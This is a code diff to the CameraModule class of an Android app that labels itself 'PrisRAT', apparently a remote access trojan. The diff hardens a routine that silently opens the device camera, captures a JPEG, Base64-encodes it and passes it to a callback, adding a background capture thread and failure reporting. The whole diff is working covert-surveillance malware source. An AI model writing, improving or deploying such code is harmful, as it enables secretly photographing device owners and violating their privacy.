@@ -12,7 +12,10 @@ import android.hardware.camera2.CaptureRequest;
 import android.media.Image;
 import android.media.ImageReader;
 import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.util.Base64;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 
@@ -20,6 +23,7 @@ import java.nio.ByteBuffer;
 import java.util.Collections;
 
 public class CameraModule {
+    private static final String TAG = "PrisRAT";
     private final Context ctx;
     private final CameraCallback callback;
 
@@ -51,7 +55,18 @@ public class CameraModule {
             }
             if (cameraId == null) { callback.onPhoto(""); return; }
 
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (ctx.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                    callback.onPhoto("");
+                    return;
+                }
+            }
+
             final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+            HandlerThread thread = new HandlerThread("CamThread");
+            thread.start();
+            Handler handler = new Handler(thread.getLooper());
+
             reader.setOnImageAvailableListener(r -> {
                 Image img = r.acquireLatestImage();
                 if (img != null) {
@@ -63,14 +78,7 @@ public class CameraModule {
                     callback.onPhoto(b64);
                     r.close();
                 }
-            }, null);
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                if (ctx.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                    callback.onPhoto("");
-                    return;
-                }
-            }
+            }, handler);
 
             cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
@@ -83,19 +91,28 @@ public class CameraModule {
                                 @Override
                                 public void onConfigured(@NonNull CameraCaptureSession session) {
                                     try {
-                                        session.capture(b.build(), null, null);
-                                    } catch (Exception ignored) {}
+                                        session.capture(b.build(), null, handler);
+                                    } catch (Exception e) {
+                                        callback.onPhoto("");
+                                    }
                                 }
                                 @Override
-                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
-                            }, null);
-                    } catch (Exception ignored) {}
+                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                                    callback.onPhoto("");
+                                }
+                            }, handler);
+                    } catch (Exception e) {
+                        callback.onPhoto("");
+                    }
                 }
                 @Override
                 public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                 @Override
-                public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
-            }, null);
+                public void onError(@NonNull CameraDevice camera, int error) {
+                    camera.close();
+                    callback.onPhoto("");
+                }
+            }, handler);
         } catch (Exception e) {
             callback.onPhoto("");
         }
